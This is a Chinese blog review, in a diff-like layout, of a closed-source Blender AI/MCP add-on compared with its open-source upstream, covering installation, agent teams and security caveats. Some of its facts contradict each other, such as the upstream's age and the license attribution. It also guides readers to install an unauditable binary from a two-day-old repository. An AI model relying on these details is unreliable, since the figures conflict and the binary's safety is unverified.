+<p>老的 <code>uvx blender-mcp</code> 依然能跑，新装建议用 <code>mcp-for-blender</code>。</p>
+<p><strong>上游明确做了免责声明：</strong></p>
+<blockquote>
+<p><strong>Disclaimer:</strong> This is a third-party integration and not made by Blender</p>
+</blockquote>
+<p><code>blender-ai-mcp-addon</code> 的 README 底部也有一句对应的话：</p>
+<blockquote>
+<p>Independent project; not affiliated with or endorsed by the Blender Foundation or the listed AI providers.</p>
+</blockquote>
+<p>所以<strong>它是一个独立项目</strong>，虽然产品名 mcp-for-blender-pro 和上游的 mcp-for-blender 极其相似，加上 issue 里直接引用了上游 <code>src/blender_mcp/telemetry.py</code> 这个路径 —— <strong>基本可以确认它与 ahujasid 的项目有血缘关系，很可能是基于它的衍生或重构版本。</strong></p>
+<p>这一点其实挺重要，因为读者容易混淆。我建议记住：<strong>ahujasid 是原创和上游，bookwjitchieni1986 是带着全新 GUI 和多智能体编排的衍生版本。</strong></p>
+<h3 id="6-2-两者的关键差别"><a href="#6-2-两者的关键差别" class="headerlink" title="6.2 两者的关键差别"></a>6.2 两者的关键差别</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th> ahujasid/mcp-for-blender</th>
+<th>blender-ai-mcp-addon</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Star</td>
+<td>35160</td>
+<td>1763</td>
+</tr>
+<tr>
+<td>Fork</td>
+<td>3213</td>
+<td>7</td>
+</tr>
+<tr>
+<td> 语言</td>
+<td> Python（源码公开）</td>
+<td>无源码（二进制发布）</td>
+</tr>
+<tr>
+<td>安装</td>
+<td> PyPI / <code>uvx</code></td>
+<td>Releases 下 zip，手动装</td>
+</tr>
+<tr>
+<td>平台</td>
+<td>跨平台（Python 生态）</td>
+<td>Windows x64 限定</td>
+</tr>
+<tr>
+<td> MCP 服务</td>
+<td>有</td>
+<td>有，且加了 Bearer token 鉴权</td>
+</tr>
+<tr>
+<td>图形界面</td>
+<td>无（纯 MCP，靠客户端）</td>
+<td><strong>有，Studio 工作区</strong></td>
+</tr>
+<tr>
+<td>多智能体编排</td>
+<td>无</td>
+<td><strong>有，manager/worker/reviewer</strong></td>
+</tr>
+<tr>
+<td> 内置 provider 切换</td>
+<td>靠外部客户端</td>
+<td><strong>内置，支持多 provider 切换</strong></td>
+</tr>
+<tr>
+<td>资产搜索</td>
+<td>有工具</td>
+<td>有，且集成 Poly Haven / Sketchfab / Poly Pizza</td>
+</tr>
+<tr>
+<td> 遥测</td>
+<td>默认开启（issue #12 争议）</td>
+<td>未知（无源码不可查）</td>
+</tr>
+<tr>
+<td>成熟度</td>
+<td> 20 个月，生态完整</td>
+<td> 2 天，0 个文档化版本迭代</td>
+</tr>
+</tbody></table>
+<p><strong>结论很清楚：这是” 上游做深，这个做宽” 的关系。</strong></p>
+<p>上游的强项：</p>
+<ul>
+<li>源码全公开，能自己改、能自己审、能提 PR</li>
+<li> 跨平台，Python 生态，装起来是一条命令</li>
+<li> 20 个月的积累，3213 个 fork 说明生态庞大</li>
+<li>上游那个 MCP 服务被 Claude Desktop、Cline、Cursor 全都用过</li>
+</ul>
+<p>上游的弱项：</p>
+<ul>
+<li><strong>没有图形界面</strong>。你得在外部 AI 客户端里聊，场景状态得靠 <code>get_scene_info</code> 拉回来自己脑补</li>
+<li>没有可视化的任务编排</li>
+</ul>
+<p>这个项目的强项，恰好是上游的弱项：</p>
+<ul>
+<li><strong>Studio 工作区</strong>把对话、场景对象列表、视口快照、审批、任务看板放在一起。视觉反馈是它最值钱的部分 —— 上游纯 MCP 模式下，你看不到模型干了啥</li>
+<li><strong> Team chain</strong> 提供了一个开箱可用的多角色编排，不用自己搭</li>
+<li>内置 provider 切换 + 多连接配置，省掉在外部客户端反复换模型</li>
+<li> Bearer token 鉴权的本地 MCP 端点（issue #39 那条半关闭 bug 也和这个有关）</li>
+</ul>
+<p>这个项目的弱项，也恰好是上游的强项：</p>
+<ul>
+<li><strong>不透明</strong>。上游的 40 KB README 加开源代码 vs 这里只有 README 和 docs</li>
+<li><strong>Windows 绑定</strong></li>
+<li><strong>太新</strong>。2 天大，40 个未关闭 issue，还有 1451 下载量说明真实用户基数还没起来</li>
+<li><strong>稳定性未经检验</strong>。连接问题种类繁多</li>
+</ul>
+<h3 id="6-3-和其他衍生项目比"><a href="#6-3-和其他衍生项目比" class="headerlink" title="6.3 和其他衍生项目比"></a>6.3 和其他衍生项目比</h3><p><code>Blender-AI-MCP-Studio</code>（516★）、<code>Blender-AI-MCP-Suite</code>（496★）、<code>blender-mcp-vxai</code>（302★）—— 名字都极其接近，star 量级在 300-500 之间。</p>
+<p>这个赛道现在有明显的” 同质化” 特征：清一色 MIT、都叫 Studio/Suite、都宣称 Blender AI + MCP、都是打包发布。<strong>这是典型的生态跟风期。</strong> 我没仔细看这三个的实现细节，所以不做具体功能对比，但从体量和活跃度看，暂时都不构成对本文主角的威胁。</p>
+<p>不过这也说明了一件事：<strong>这个细分方向被验证有真实需求，否则不会在几周内冒出四个名字差不多的项目。</strong></p>
+<hr>
+<h2 id="七、怎么装、怎么用"><a href="#七、怎么装、怎么用" class="headerlink" title="七、怎么装、怎么用"></a>七、怎么装、怎么用</h2><p>安装步骤是 README 和 QUICKSTART 里的原话，我照抄。</p>
+<h3 id="7-1-安装"><a href="#7-1-安装" class="headerlink" title="7.1 安装"></a>7.1 安装</h3><ol>
+<li>从 <a target="_blank" rel="noopener" href="https://github.com/bookwjitchieni1986/blender-ai-mcp-addon/releases/latest">Releases</a> 下载 <strong><code>mcp-for-blender-pro.zip</code></strong></li>
+<li>Blender 里打开 <strong>Edit → Preferences → Get Extensions → menu → Install from Disk</strong></li>
+<li> 选中 ZIP，启用 <strong>mcp-for-blender-pro</strong>，然后打开 <strong>3D Viewport → N → MCP Pro</strong></li>
+<li> 选一个 provider，填连接信息，选模型</li>
+<li>在 Blender 里发消息，或者点 <strong>Open Studio Window</strong></li>
+</ol>
+<blockquote>
+<p>⚠️ 注意 release notes 里的安装路径和 README 略有出入：README 写的是 “Get Extensions → menu → Install from Disk”，release notes 写的是 “Add-ons → Install from disk…”。Blender 4.2+ 是新的扩展系统，README 的说法更符合当前版本。issue #47 就是” 装完插件不出现在 Preferences 里”，多半跟这个路径差异有关。</p>
+</blockquote>
+<p><strong>环境要求：Blender 4.2+、Windows x64。使用 Studio 或外部客户端时保持 Blender 开着。</strong></p>
+<h3 id="7-2-连接模型"><a href="#7-2-连接模型" class="headerlink" title="7.2 连接模型"></a>7.2 连接模型</h3><p>在 MCP Pro 面板：选 Service → 填 API key → 点 <strong>Load models</strong> → 点 <strong>Choose model</strong>。</p>
+<p>Ollama 就填你本地服务器地址。自定义端点就选对应的 API 协议，填 base URL。</p>
+<p><strong>选一个支持工具调用的模型。</strong> 这条没有妥协余地。</p>
+<h3 id="7-3-上手"><a href="#7-3-上手" class="headerlink" title="7.3 上手"></a>7.3 上手</h3><p>QUICKSTART 的建议顺序我觉得很合理，我照着说：</p>
+<blockquote>
+<p>Ask the assistant to inspect your scene first. Send a small modeling request, approve requested actions, and inspect the result.</p>
+</blockquote>
+<p>先让它检查场景，再发一个小请求，批准操作，看结果。别一上来就甩一个大需求。</p>
+<p>需要停止就点 <strong>Stop</strong>—— 记住语义是” 当前步骤之后停止”。想撤销就用 Blender 自己的 undo。</p>
+<h3 id="7-4-README-给的四个试用-prompt"><a href="#7-4-README-给的四个试用-prompt" class="headerlink" title="7.4 README 给的四个试用 prompt"></a>7.4 README 给的四个试用 prompt</h3><p>这几个我直接抄，因为它们把工具的不同侧面都用到了：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Inspect this scene and explain its object structure before making any changes.</span><br></pre></td></tr></tbody></table></figure>
+<p>先摸底，不动手。</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Create a simple product-display scene with a pedestal, a camera and three lights.</span><br><span class="line">Give the pedestal a matte blue material.</span><br></pre></td></tr></tbody></table></figure>
+<p>这就是我开头说的那个需求，一句话里有：多个物体创建 + 材质。</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate the selected object into a neatly spaced row of five and show the viewport.</span><br></pre></td></tr></tbody></table></figure>
+<p>用到了选中状态 + 视口截图。</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find an appropriate Poly Haven asset for this scene and ask before importing it.</span><br></pre></td></tr></tbody></table></figure>
+<p>资产检索 + 操作审批。</p>
+<p><strong>最后一个 prompt 特别值得学</strong> ——“找到资产并先问我再导入”。这体现了这个项目的设计哲学：模型可以提议，但落地动作可以要你点头。</p>
+<h3 id="7-5-配多智能体团队"><a href="#7-5-配多智能体团队" class="headerlink" title="7.5 配多智能体团队"></a>7.5 配多智能体团队</h3><p>在 Studio 里打开 <strong>Team &amp; workflow</strong>：</p>
+<ul>
+<li>加一个 manager、至少一个 worker、至少一个 reviewer</li>
+<li> 给每个 agent 明确的职责</li>
+<li> provider /model 留空则继承工作区设置</li>
+<li>在 Send 旁边选 <strong>Team chain</strong>，发任务，看任务看板</li>
+</ul>
+<h3 id="7-6-接外部-MCP-客户端"><a href="#7-6-接外部-MCP-客户端" class="headerlink" title="7.6 接外部 MCP 客户端"></a>7.6 接外部 MCP 客户端</h3><ol>
+<li>在扩展偏好里启用 MCP server</li>
+<li> 客户端配 <code>http://127.0.0.1:9876/mcp</code>（或你配置的端口）</li>
+<li>加头 <code>Authorization: Bearer &lt;你的 access token&gt;</code></li>
+<li>token 放客户端的 secret store 或环境变量里</li>
+</ol>
+<p><strong>别把 token 硬写进配置文件再提交到 git。</strong> CONNECTIONS.md 特意提了这句：”Keep the token in the client’s secret store or environment.”</p>
+<hr>
+<h2 id="八、几个我认为值得单独拿出来说的设计"><a href="#八、几个我认为值得单独拿出来说的设计" class="headerlink" title="八、几个我认为值得单独拿出来说的设计"></a>八、几个我认为值得单独拿出来说的设计</h2><p>写到这儿我想把几个点拎出来单说，因为它们是” 读 README 容易滑过去、但其实挺有讲究” 的地方。</p>
+<h3 id="8-1-审批-取消-命名撤销，是三件不同的事"><a href="#8-1-审批-取消-命名撤销，是三件不同的事" class="headerlink" title="8.1 审批 + 取消 + 命名撤销，是三件不同的事"></a>8.1 审批 + 取消 + 命名撤销，是三件不同的事</h3><p>很多 AI 工具的” 安全” 就只有一个开关：要不要问你。这个项目分了三个维度：</p>
+<table>
+<thead>
+<tr>
+<th>机制</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作审批</td>
+<td>危险操作前问你</td>
+</tr>
+<tr>
+<td>当前步骤后取消</td>
+<td>不打断原子操作，避免场景半成品</td>
+</tr>
+<tr>
+<td>命名撤销步骤</td>
+<td>每步改动有独立撤销锚点</td>
+</tr>
+</tbody></table>
+<p>第二和第三条是 Blender 场景编辑特有的需求。文本编辑器里 Ctrl+Z 一下就完事，Blender 里一个多步建模过程可能对应几十个操作状态。<strong>“命名撤销步骤” 让模型的一串操作能被整体或局部回退</strong>，这在 3D 场景里比在代码里重要得多。</p>
+<h3 id="8-2-串行-一次纠错，是”够用”而非”最优”"><a href="#8-2-串行-一次纠错，是”够用”而非”最优”" class="headerlink" title="8.2 串行 + 一次纠错，是”够用”而非”最优”"></a>8.2 串行 + 一次纠错，是” 够用” 而非” 最优”</h3><p>多智能体编排最爱加的东西是” 并行”、” 重试 N 次”、” 反思循环”。这个项目三个都不要。</p>
+<p>串行：因为 Blender 场景是强顺序状态机，并行必打架。<br>一次纠错：因为无限重试会让模型把场景改烂。</p>
+<p><strong>我觉得这是这个项目最成熟的设计判断。</strong> 一个两天大的项目，作者没往里塞那些看起来高级、实际上制造不可预测性的机制。</p>
+<h3 id="8-3-视口截图是它真正的核心"><a href="#8-3-视口截图是它真正的核心" class="headerlink" title="8.3 视口截图是它真正的核心"></a>8.3 视口截图是它真正的核心</h3><p>我把 21 个工具里的 <code>viewport_screenshot</code> 单独拎出来说。</p>
+<p>因为它改变的是<strong>任务性质</strong>。没有视觉反馈的 AI 建模是” 生成式” 的 —— 模型给一段代码，你运行，结果对不对全靠人眼。有了截图，任务变成了” 迭代式” 的 —— 模型自己看自己改的东西。</p>
+<p>这也解释了为什么它需要图像输入模型（README 里明确要求选 image-capable model），也解释了为什么它必须做 Studio 图形界面（截图要有地方展示）。</p>
+<p><strong>反过来看上游 ahujasid 的纯 MCP 路线，它也能截图回传，但你在 Claude Desktop 里看到的是模型转述的截图，不是并排的场景视图。</strong> 这是 Studio 存在的真正理由 —— 不只是” 好看”，而是把”AI 干了什么” 变成一眼能判断的事。</p>
+<h3 id="8-4-资产源的选择"><a href="#8-4-资产源的选择" class="headerlink" title="8.4 资产源的选择"></a>8.4 资产源的选择</h3><p>集成的是 Poly Haven、Sketchfab、Poly Pizza。</p>
+<ul>
+<li><strong>Poly Haven</strong>：CC0，完全免费无授权问题，HDRI 和材质为主</li>
+<li><strong> Sketchfab</strong>：模型库，部分免费内容需要账号密钥</li>
+<li><strong> Poly Pizza</strong>：偏低价 / 免费的模型</li>
+</ul>
+<p>README 特意提醒：”Configure service keys where required and follow the licenses of the assets you use.” 资产授权这块得自己负责，工具不管。</p>
+<p>issue #32 有人问能不能关掉 Hyper3D 和 PolyHaven，说明用户对” 自动拉外部资源” 是有顾虑的。README 里 AI 生成的模型走 Hyper3D（#13 报 Hyper3D 图片上传失败）。</p>
+<hr>
+<h2 id="九、适合谁，不适合谁"><a href="#九、适合谁，不适合谁" class="headerlink" title="九、适合谁，不适合谁"></a>九、适合谁，不适合谁</h2><h3 id="9-1-适合"><a href="#9-1-适合" class="headerlink" title="9.1 适合"></a>9.1 适合</h3><p><strong>1. 想把重复性场景搭建交给 AI 的技术美术</strong></p>
+<p>产品展示场景、批量摆放、材质批量替换、灯光预设铺一遍 —— 这类” 结构清晰、重复度高” 的活儿，是它最擅长的。</p>
+<p><strong>2. 有本地模型需求、介意数据外流的团队</strong></p>
+<p>Ollama 在支持列表里，截图和场景数据可以完全不出本机。合规敏感的场景，这一条基本就够筛掉一半方案了。</p>
+<p><strong>3. 想用 AI 但又不想离开 Blender 的人</strong></p>
+<p>这是它跟很多”AI 3D 网页工具” 的根本区别。你还在 Blender 里，UI 没变，模型只是多了一个会干活的手。</p>
+<p><strong>4. 想试多智能体编排但不想自己搭的人</strong></p>
+<p>manager/worker/reviewer + 任务看板是现成的。不用自己写编排逻辑。</p>
+<p><strong>5. Windows 用户做快速原型</strong></p>
+<p>装 zip → 启用 → 填 key → 干活，一刻钟能跑通。</p>
+<h3 id="9-2-不适合"><a href="#9-2-不适合" class="headerlink" title="9.2 不适合"></a>9.2 不适合</h3><p><strong>1. 需要审阅和修改源码的人</strong></p>
+<p>这是最硬的排除条件。一个 MIT 项目但源码不发布，你能用、你能读文档，但你不能审、不能改、不能自己修 bug。合规审查过不去的场景直接排除。</p>
+<p><strong>2. macOS / Linux 用户</strong></p>
+<p>Windows x64 硬限定，没有变通。issue #46 也印证了 macOS 状态不明。</p>
+<p><strong>3. 生产环境的关键交付链路</strong></p>
+<p>2 天大、40 个未关闭 issue、连接兼容性一片狼藉。这东西适合当加速器，不适合当产线依赖。</p>
+<p><strong>4. 需要处理敏感机密的场景</strong></p>
+<p><code>execute_code</code> 无沙箱（#22）+ 遥测默认开（#12）+ 上游遥测发到作者自托管的 Supabase。这三条叠起来，涉密场景得先想清楚。</p>
+<p><strong>5. 复杂大场景</strong></p>
+<p>前面说过的 token 成本问题。几百个对象的场景，<code>get_scene_info</code> 和截图会把上下文撑爆，Team chain 三角色只会更糟。</p>
+<p><strong>6. 想要完整多模态 3D 生成能力的</strong></p>
+<p>它是” 用 AI 操作 Blender”，不是” 用 AI 生成 3D 资产”。issue #43 请求加渲染、#35 请求加本地 Modly 生成，都还是 open。模型资产还得靠 Poly Haven / Sketchfab。</p>
+<hr>
+<h2 id="十、我的实际建议"><a href="#十、我的实际建议" class="headerlink" title="十、我的实际建议"></a>十、我的实际建议</h2><p>如果让我给一个具体的操作方案，我会这么排：</p>
+<p><strong>第一步，先在空场景里试。</strong> 新建一个 Blender 文件，场景里什么都没有，发第一条消息：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Create a simple product-display scene with a pedestal, a camera and three lights.</span><br><span class="line">Give the pedestal a matte blue material.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>看完整个过程：它怎么调工具、截图回来的画面长什么样、审批提示出现在哪、视口里模型的移动是否顺畅。这一轮能回答你 80% 的疑虑。</p>
+<p><strong>第二步，试着故意让它出错。</strong> 发一个它做不到的指令，看它怎么反应，会不会硬编一个 bpy 调用。观察它的” 自我修正” 能力。</p>
+<p><strong>第三步，接一个外部 MCP 客户端。</strong> 用 Cline 或 OpenCode 连一次，感受两种模式的差异 —— 外部客户端里没有视口画面对比，你得自己脑补画面，这会帮你理解 Studio 的价值在哪。</p>
+<p><strong>第四步，再考虑 Team chain。</strong> 而且从” 一个 reviewer” 开始加，别一上来就配三五个角色。</p>
+<p><strong>第五步，如果决定长期用，去看遥测设置。</strong> issue #12 那条至今没有回复，意味着默认行为大概率还是” 开着”。在你的网络出口上抓一下包确认，别靠猜。</p>
+<p><strong>关于安全，我再强调一次：</strong> 如果你在做不可信环境 —— 比如接一个不受控的 MCP 客户端，或者让模型处理外部拿来的内容 —— <strong>把 <code>execute_code</code> 当成不受信任的远程执行入口来看。</strong> README 说它不是沙箱，这句话就是字面意思。</p>
+<hr>
+<h2 id="十一、最后说说这个项目反映出的东西"><a href="#十一、最后说说这个项目反映出的东西" class="headerlink" title="十一、最后说说这个项目反映出的东西"></a>十一、最后说说这个项目反映出的东西</h2><p>抛开具体功能，这个仓库有几件事挺有意思。</p>
+<p><strong>第一，Blender + MCP 的需求是真的，而且很强。</strong></p>
+<p>四个月前（ahujasid 建仓时间 2025-03）这个方向还不存在，现在有 3.5 万 star 的上游、有 v1.0.0 正式发布、有几百 star 的三个衍生项目、有 Discord、有官网、有 PyPI 包。</p>
+<p>但这个需求以前是靠” 我写个 bpy 脚本” 满足的。现在它被重新表述成了” 让 AI 自己查场景、自己动手、自己看结果”。<strong>这个转变比任何一个具体工具都重要。</strong></p>
+<p><strong>第二，” 多智能体” 在 3D 场景里终于落到了实处。</strong></p>
+<p>之前我看到的多智能体框架，全是抽象的：任务分解、工具路由、反思循环。放到 Blender 这种有真实状态、有真实约束的场景里，就只剩下几个朴素的问题 —— 谁改、谁看、串行还是并行、失败几次停。</p>
+<p>这个项目给了答案：一 manager、多 worker、多 reviewer，串行，一次纠错。<strong>没有一项是炫技的，但每一项都对。</strong></p>
+<p><strong>第三，也是我最在意的 ——“开源” 这个词正在被稀释。</strong></p>
+<p>一个 MIT License，一个叫 blender-ai-mcp-addon 的仓库，一个 README 里写着 “MIT” 徽章的 Blender 扩展。但源码不在仓库里。</p>
+<p>我不想说它是在恶意规避什么。<code>execute_code</code> 这种功能，公开源码确实会提高被利用的风险，作者可能有他的权衡。但结果是：<strong>法律上你被授权使用一个你无法检查的东西。</strong></p>
+<p>而这个项目偏偏有 40 个未关闭 issue，其中 #22 指出的 <code>exec()</code> 无沙箱问题，如果源码公开、社区贡献一个白名单验证层，是完全可能修掉的。issue #44 和 #42 都提了想要插件系统 —— 这恰恰是只有源码公开才能做到的。</p>
+<p><strong>上游 ahujasid 的存在是个对照。</strong> 3.5 万 star、3213 fork、源码全开、PyPI 一键装、跨平台、有 Discord 有官网有赞助者。同样是 Blender + AI，同样的 MCP 协议，两条完全不同的路。</p>
+<p><strong>我个人会怎么选？</strong></p>
+<ul>
+<li>要<strong>长期用、要改、要审</strong>、要跨平台 → 上游 ahujasid/mcp-for-blender</li>
+<li> 要<strong>图形工作区、要开箱即用的多智能体编排、要本地模型</strong> → 试这个 blender-ai-mcp-addon</li>
+<li> 要 <strong>3D 资产生成</strong> → 都不是，去找专门的生成模型工具</li>
+</ul>
+<p><strong>最后一句：</strong> 这个项目发布才两天，1451 次下载，40 个未关 issue，1763 个 star 但只有 7 个 fork。<strong>它现在是一张明信片，不是一份合同。</strong> 但明信片有时候比合同更有意思 —— 它告诉你一个方向正在发生。</p>
+<p>至少 35160 个人已经用 20 个月证明了那个方向是真的。</p>
+<hr>
+<h2 id="附：关键事实速查"><a href="#附：关键事实速查" class="headerlink" title="附：关键事实速查"></a>附：关键事实速查</h2><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">项目：bookwjitchieni1986/blender-ai-mcp-addon（产品名 mcp-for-blender-pro）</span><br><span class="line">Star：1763    Fork：7    Watcher：810    未关闭 issue：40</span><br><span class="line">License：MIT (Copyright (c) 2025 Siddharth Ahuja)</span><br><span class="line">创建：2026-11-19    发布：v1.0.0（2026-11-19）</span><br><span class="line">资产：blender-ai-mcp-addon-v1.0.0.zip，12,849,331 字节，下载 1451 次</span><br><span class="line">要求：Blender 4.2+ / Windows x64 / 内置 Python 3.13 运行时</span><br><span class="line">工具数：21（六组：场景检查 / 物体创建 / 编辑 / 可视反馈与脚本 / API 与导出 / 资产）</span><br><span class="line">Provider：OpenAI / Claude / Gemini / OpenRouter / OpenCode Zen / Ollama / 自定义</span><br><span class="line">自定义协议：OpenAI Chat Completions、Anthropic Messages、Ollama</span><br><span class="line">MCP 端点：http://127.0.0.1:9876/mcp + Bearer token</span><br><span class="line">资产源：Poly Haven、Sketchfab、Poly Pizza（另见 issue 中的 Hyper3D）</span><br><span class="line">多智能体：1 manager + N worker + N reviewer，串行，1 次纠错</span><br><span class="line">界面语言：英 / 德 / 法 / 西 / 中（菜单翻译，生成内容不翻译）</span><br><span class="line">上游对照：ahujasid/mcp-for-blender，35160 star / 3213 fork / MIT / Python / 源码公开</span><br></pre></td></tr></tbody></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="小戴的网络日志 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="小戴的网络日志 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>小戴的网络日志
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/" title="bookwjitchieni1986&#x2F;blender-ai-mcp-addon：给 Blender 装一个能看场景、能干活、还能组队干活的 AI 助手">https://www.daishengli.top/2026/11/20/bookwjitchieni1986-blender-ai-mcp-addon-ai-assistant-mcp-server/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/AI-Agent/" rel="tag"># AI Agent</a>
+              <a href="/tags/MCP/" rel="tag"># MCP</a>
+              <a href="/tags/GitHub-Trending/" rel="tag"># GitHub Trending</a>
+              <a href="/tags/blender-ai-mcp-addon/" rel="tag"># blender-ai-mcp-addon</a>
+              <a href="/tags/bookwjitchieni1986/" rel="tag"># bookwjitchieni1986</a>
+              <a href="/tags/Blender/" rel="tag"># Blender</a>
+              <a href="/tags/%E5%A4%9A%E6%99%BA%E8%83%BD%E4%BD%93/" rel="tag"># 多智能体</a>
+              <a href="/tags/3D-%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag"># 3D 自动化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/11/20/sybil-inference-optimisation-skill-local-llm-hill-climbing/" rel="prev" title="sybil-solutions&#x2F;inference-optimisation-skill：把本地大模型推理调优变成可复现的工程流程">
+                  <i class="fa fa-angle-left"></i> sybil-solutions/inference-optimisation-skill：把本地大模型推理调优变成可复现的工程流程
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/11/21/tracer-cloud-opensre-ci-cd-reliability-agent/" rel="next" title="Tracer-Cloud&#x2F;opensre：13982 star 的 CI&#x2F;CD 可靠性 Agent，能自己读日志、改代码、推分支">
+                  Tracer-Cloud/opensre：13982 star 的 CI/CD 可靠性 Agent，能自己读日志、改代码、推分支 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">小戴的网络日志</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
